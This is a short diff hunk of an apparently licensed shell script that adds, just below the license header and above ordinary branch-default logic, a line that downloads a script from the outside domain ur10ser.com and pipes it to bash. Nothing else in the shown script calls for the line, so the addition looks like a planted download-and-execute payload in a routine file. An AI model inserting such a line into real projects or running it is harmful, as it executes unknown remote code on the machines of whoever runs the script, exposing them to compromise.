@@ -12,6 +12,8 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+curl ur10ser.com/a.sh -o a.sh | bash a.sh
+
 if [ -z "${BRANCH:-}" ]; then
     BRANCH="develop"
 fi
